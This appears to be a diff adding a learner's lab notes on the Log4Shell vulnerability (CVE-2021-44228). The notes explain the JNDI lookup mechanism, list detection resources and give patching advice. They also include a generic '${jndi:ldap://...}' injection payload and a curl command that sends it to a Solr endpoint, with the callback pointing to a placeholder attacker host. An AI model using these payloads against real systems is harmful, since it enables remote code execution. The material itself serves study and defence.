@@ -1,0 +1,48 @@
+CVE-2021-44228 affects Java logging package log4j - leads to RCE
+Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package
+SW & servies affected by log4j https://github.com/YfryTchsGD/Log4jAttackSurface
+Millions of applications as well as software providers use this package as a dependency in their own code.
+Log4j Vuln Tester - https://log4shell.huntress.com/
+
+APACH SOLR 8.10.0 & below are vuln
+---------------------------------------------------------
+general payload 
+${jndi:ldap://ATTACKERCONTROLLEDHOST}
+
+This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to 
+access external resources, or "references," which is what is weaponized in this attack. 
+
+"ldap://" target will reach out to an endpoint (an attacker controlled location) via the LDAP protocol.
+
+"ATTACKERCONTROLLEDHOST" is where the inject happens
+
+$ curl 'http://10.10.121.110:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:AttackerPOrt\}'
+
+Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes so bash (your command-line shell) 
+does not interpret it as a variable. Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented 
+in the curl command arguments.
+
+DETECTION------------------------
+Unfortunately, finding applications vulnerable to CVE-2021-44228 "Log4Shell" is hard.
+
+Detecting exploitation might be even harder, considering the unlimited amount of potential bypasses. 
+
+With that said, the information security community has seen an incredible outpouring of effort and support to develop tooling, script, and code to better 
+constrain this threat. While this room won't showcase every technique in detail, you can again find an enormous amount of resources online.
+
+Below are snippets that might help either effort:
+
+https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
+https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
+https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
+https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
+https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)
+
+
+
+
+Where appropriate, please ensure you patch the logging-log4j package to version 2.16.0 or higher (as new releases come available). In version 2.16.0 , JNDI is 
+fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present. Download this release here: 
+https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0
+Affected SW & Services
+https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/
